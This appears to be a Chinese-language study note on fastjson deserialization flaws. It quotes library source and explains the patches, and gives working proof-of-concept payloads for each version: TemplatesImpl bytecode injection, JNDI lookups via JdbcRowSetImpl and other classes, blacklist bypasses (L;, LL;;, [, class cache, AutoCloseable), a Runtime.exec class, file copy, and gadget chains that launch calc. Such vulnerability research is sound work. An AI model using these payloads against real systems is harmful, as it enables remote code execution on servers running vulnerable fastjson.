---
tags:
  - java安全
title: fastjson安全
date: 2025-03-27
---

# 基础
```java
String jsonString = "{\"@type\":\"Student\",\"age\":0,\"cmd\":\"Calc\"}";
Object student1 = JSON.parseObject(jsonString);
```

fastjson 在反序列化的时候会去找我们在 `@type` 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。

具体堆栈如下。

```
build:328, JavaBeanInfo (com.alibaba.fastjson.util)
createJavaBeanDeserializer:526, ParserConfig (com.alibaba.fastjson.parser)
getDeserializer:461, ParserConfig (com.alibaba.fastjson.parser)
getDeserializer:312, ParserConfig (com.alibaba.fastjson.parser)
parseObject:367, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
parseObject:201, JSON (com.alibaba.fastjson)
```

这里说两个关键的点。

parseObject:367, DefaultJSONParser  这个地方。这个  JSON.DEFAULT_TYPE_KEY 值是 @type 。然后key这里如果是 @type 的话会对里面的类进行实例化。

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```

然后是 JavaBeanInfo.build() 这个地方。这三个循环分别是获取seter 获取 field ，获取 getter。但是getter对返回值有一些严苛的要求。

```java
for (Method method : methods) { //
    int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;
    String methodName = method.getName();
    if (methodName.length() < 4) {
        continue;
    }

    if (Modifier.isStatic(method.getModifiers())) {
        continue;
    }

    // support builder set
    if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) {
        continue;
    }
    Class<?>[] types = method.getParameterTypes();
    if (types.length != 1) {
        continue;
    }
     ...........................
    if (!methodName.startsWith("set")) { // TODO "set"的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？
        continue;
    }
    ....................
}

for (Field field : clazz.getFields()) { // public static fields
}

for (Method method : clazz.getMethods()) { // getter methods
    String methodName = method.getName();
    if (methodName.length() < 4) {
        continue;
    }

    if (Modifier.isStatic(method.getModifiers())) {
        continue;
    }

    if (methodName.startsWith("get") && Character.isUpperCase(methodName.charAt(3))) {
        if (method.getParameterTypes().length != 0) {
            continue;
        }

        if (Collection.class.isAssignableFrom(method.getReturnType()) //
            || Map.class.isAssignableFrom(method.getReturnType()) //
            || AtomicBoolean.class == method.getReturnType() //
            || AtomicInteger.class == method.getReturnType() //
            || AtomicLong.class == method.getReturnType() //
        ) {
            String propertyName;
        .......
}
```

**直接说结论，Fastjson会对满足下列要求的setter/getter方法进行调用：**
满足条件的setter：

- 非静态函数
- 返回类型为void或当前类
- 参数个数为1个

满足条件的getter：

- 非静态方法
- 无参数
- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong**



# 1.2.24

## TemplatesImplPoc

就是fastjson会将类型为byte的自动base64解码。

这里我们在反序列化的时候的参数需要加上 `Object.class` 与 `Feature.SupportNonPublicField`，因为 `getOutputProperties()` 方法是私有的。

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

// TemplatesImpl 链子的 EXP
public class TemplatesImplPoc {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
            final String evilClassPath = "D:\\classes\\Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'Drunkbaby','_tfactory':{ },\"_outputProperties\":{ },";
            System.out.println(text1);

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

## JdbcRowSetImpl

这个类也是一个很常见的sink点了。

connet函数可以触发jndi注入。然后调用它的有getDatabaseMetaData和setAutoCommit方法。getDatabaseMetaData返回值不满足要求所以这个地方只能用setAutoCommit。

```java
import com.alibaba.fastjson.JSON;

// 基于 JdbcRowSetImpl 的利用链
public class JdbcRowSetImplRmiExp {
    public static void main(String[] args) {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}

```

## 修复

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```

parseObject:367, DefaultJSONParser  这个地方。loadClass在ParserConfig.checkAutoType中实现。

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = config.checkAutoType(typeName, null);
```

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }
 
    final String className = typeName.replace('$', '.');
 
    // autoTypeSupport默认为False
    // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤
    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }
 
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }
 
    // 从Map缓存中获取类，注意这是后面版本的漏洞点
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }
 
    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }
 
        return clazz;
    }
 
    // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错
    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
 
                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }
 ............................
}
```

通过对黑名单的研究，我们可以找到具体版本有哪些利用链可以利用。

从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：https://github.com/LeadroyaL/fastjson-blacklist

# 黑名单绕过

## 1.2.45

因为只是对黑名单的绕过。就写到前面了。

```xml
<dependency>
    <groupId>org.mybatis</groupId>
    <artifactId>mybatis</artifactId>
    <version>3.4.0</version>
</dependency>
```

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String payload ="{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\"," +
        "\"properties\":{\"data_source\":\"ldap://localhost:1234/Exploit\"}}";
JSON.parse(payload);
```

这个类JndiDataSourceFactory 的 setProperties 有jndi的注入点。

```java
public void setProperties(Properties properties) {
    try {
        InitialContext initCtx = null;
        Properties env = getEnvProperties(properties);
        if (env == null) {
            initCtx = new InitialContext();
        } else {
            initCtx = new InitialContext(env);
        }

        if (properties.containsKey("initial_context") && properties.containsKey("data_source")) {
            Context ctx = (Context)initCtx.lookup(properties.getProperty("initial_context"));
            this.dataSource = (DataSource)ctx.lookup(properties.getProperty("data_source"));
        } else if (properties.containsKey("data_source")) {
            this.dataSource = (DataSource)initCtx.lookup(properties.getProperty("data_source"));
        }

    } catch (NamingException e) {
        throw new DataSourceException("There was an error configuring JndiDataSourceTransactionPool. Cause: " + e, e);
    }
}
```

## 1.2.62

目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，

```java
<dependency>  
 <groupId>com.alibaba</groupId>  
 <artifactId>fastjson</artifactId>  
 <version>1.2.62</version>  
</dependency>  
<dependency>  
 <groupId>org.apache.xbean</groupId>  
 <artifactId>xbean-reflect</artifactId>  
 <version>4.18</version>  
</dependency>  
<dependency>  
 <groupId>commons-collections</groupId>  
 <artifactId>commons-collections</artifactId>  
 <version>3.2.1</version>  
</dependency>
```

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +
        " \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";
JSON.parse(poc);
```

## 1.2.66

- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；

```java
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"Realms\":[\"\"]}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";
        JSON.parse(poc);
```

## 1.2.67

- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +
        " \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";
JSON.parse(poc);
```

`{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}`

有关黑名单的绕过还有很多。网上挺多的，这里就不多说了。

# 1.2.41(L;绕过)

前面加一个 L，结尾加上 `;` 绕过

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String payload ="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Basic/Command/calc.exe\",\"autoCommit\":\"true\" }";
JSON.parse(payload);
```

首先这样加可以绕过黑名单。而且这样的类依旧是可以加载的。TypeUtils.loadClass 。

这样设计肯定是有原因，感觉可能是为了支持一种格式。

```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    if (className == null || className.length() == 0) {
        return null;
    }

    Class<?> clazz = mappings.get(className);

    if (clazz != null) {
        return clazz;
    }

    if (className.charAt(0) == '[') {
        Class<?> componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    }

    if (className.startsWith("L") && className.endsWith(";")) {
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
    }
```

## 修复

如果 L; 则去掉再去判断黑名单。

```java 
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
	................................
    if ((((BASIC
            ^ className.charAt(0))
            * PRIME)
            ^ className.charAt(className.length() - 1))
            * PRIME == 0x9198507b5af98f0L)
    {
        className = className.substring(1, className.length() - 1);
    }
    ................................
}
```

# 1.2.42(LL;;绕过)

它只去掉了一次，但是这个地方可以loadClass多次。去掉多个 L;

```java
public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
    if(className == null || className.length() == 0){
        return null;
    }
    Class<?> clazz = mappings.get(className);
    if(clazz != null){
        return clazz;
    }
    if(className.charAt(0) == '['){
        Class<?> componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    }
    if(className.startsWith("L") && className.endsWith(";")){
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
    }
```

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String payload ="{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
JSON.parse(payload);
```

修改的是直接对类名以”LL”开头的直接报错：

# 1.2.43([绕过)

但是以 `”[“`开头的类名自然能成功绕过上述校验以及黑名单过滤。

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String payload ="{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"ldap://localhost:1234/Exploit\", \"autoCommit\":true}";
JSON.parse(payload);
```

# 1.2.47(Class缓存绕过)

- 1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
- 1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；

又是一个新的思路

```java
String payload  = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},"
        + "\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
        + "\"dataSourceName\":\"ldap://127.0.0.1:1389/Basic/Command/calc.exe\",\"autoCommit\":true}}";
JSON.parse(payload);
```

MiscCodec这个类继承了ObjectDeserializer。里面也有对应loadClass。其中判断键是否为”val”，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量。然后进行对应的loadClass。

```java
if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
```

然后 com.sun.rowset.JdbcRowSetImpl 这个类会被放到缓存当中。

再次checkAutoType时由于在缓存中所以不会触发黑名单检测。

## 修复

TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，

```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    return loadClass(className, classLoader, false);
}
```



# 1.2.48

本次绕过`checkAutoType()`函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过`checkAutoType()`函数执行恶意操作。

## 原理

```java
String poc = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"VulAutoCloseable\",\"cmd\":\"open -a Calculator\"}";
JSON.parse(poc);
```

然后这个VulAutoCloseable需要我们自己写一下。

```java
public class VulAutoCloseable implements AutoCloseable {
    public VulAutoCloseable(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    public void close() throws Exception {

    }
}
```
说一下这个流程比较特别的地方。第一次走到这个地方的时候。
ParserConfig.checkAutoType
```java
if (clazz == null) {
    clazz = TypeUtils.getClassFromMapping(typeName);
}
..........
if (clazz != null) {
    if (expectClass != null
            && clazz != java.util.HashMap.class
            && !expectClass.isAssignableFrom(clazz)) {
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }

    return clazz;
}
```

此时typeName 是 java.lang.AutoCloseable 
而且 TypeUtils.getClassFromMapping(typeName)是可以获取到类的。然后直接返回class。
然后回到DefaultJSONParser.parseObject。找对应的Deserializer。然后deserialze。由于上面返回的class不是空。所以一番流程后我们最后的expectClass也是有值的。

```java
ObjectDeserializer deserializer = config.getDeserializer(clazz);
Class deserClass = deserializer.getClass();
if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
        && deserClass != JavaBeanDeserializer.class
        && deserClass != ThrowableDeserializer.class) {
    this.setResolveStatus(NONE);
} else if (deserializer instanceof MapDeserializer) {
    this.setResolveStatus(NONE);
}
Object obj = deserializer.deserialze(this, clazz, fieldName);
return obj;
```

这个Deserializer是 JavaBeanDeserializer 。中间在checkAutoType中进行一些检查。最后在deserializer.deserialze中进行实例化。
checkAutoType
```java
if (clazz == null && (autoTypeSupport || jsonType || expectClassFlag)) {
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
}

if (clazz != null) {
    if (jsonType) {
        TypeUtils.addMapping(typeName, clazz);
        return clazz;
    }

    if (ClassLoader.class.isAssignableFrom(clazz) // 防JNDI
            || javax.sql.DataSource.class.isAssignableFrom(clazz) 
            || javax.sql.RowSet.class.isAssignableFrom(clazz) 
            ) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    if (expectClass != null) {
        if (expectClass.isAssignableFrom(clazz)) {   // 为什么这个VulAutoCloseable类需要实现AutoCloseable接口
            TypeUtils.addMapping(typeName, clazz);
            return clazz;
```

```java
if (deserializer == null) {
    Class<?> expectClass = TypeUtils.getClass(type);
    userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
    deserializer = parser.getConfig().getDeserializer(userType);
}

Object typedObject = deserializer.deserialze(parser, userType, fieldName);
```

## 利用

复制文件

```java
String poc = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", " +
        "\"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"E:/flag.txt\"}";
JSON.parse(poc);
```

# FastJson与原生反序列化
https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson与原生反序列化/
https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson与原生反序列化-二/
在构建一些链子的时候用到的它的JSONArray toString可以触发任意的get方法。
FastJson<=1.2.48
```java
package ysoserial.MyGadget;  
  
import com.alibaba.fastjson.JSONArray;  
import ysoserial.payloads.util.Gadgets;  
  
import javax.management.BadAttributeValueExpException;  
  
import static ysoserial.payloads.util.Tool.*;  
  
public class FastJsontoString {  
  
    public static void main(String[] args) throws Exception{  
  
        Object templatesImpl = Gadgets.createTemplatesImpl("calc");  
          
        JSONArray jsonArray= new JSONArray();  
        jsonArray.add(templatesImpl);  
  
//        jsonArray.toString();  
  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  
        setFieldValue(badAttributeValueExpException,"val",jsonArray);  
  
        byte[] serialize = serialize(badAttributeValueExpException);  
        deserialize(serialize);  
  
    }  
}
```

FastJson从1.2.49开始，我们的JSONArray以及JSONObject方法开始真正有了自己的readObject方法，同时在`SecureObjectInputStream`类当中重写了`resolveClass`,通过调用了`checkAutoType`方法做类的检查：
简单绕过即可。
BadAttributeValueExpException 反序列化会触发toString。
```java
public class FastJsonAll {  
  
    public static void main(String[] args) throws Exception{  
  
        Object templates = Gadgets.createTemplatesImpl("calc");  
  
        JSONArray jsonArray = new JSONArray();  
        jsonArray.add(templates);  
  
        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);  
        setFieldValue(bd,"val",jsonArray);  
  
        HashMap hashMap = new HashMap();  
        hashMap.put(templates,bd);  
  
        byte[] serialize = serialize(hashMap);  
        deserialize(serialize);  
  
    }  
}
```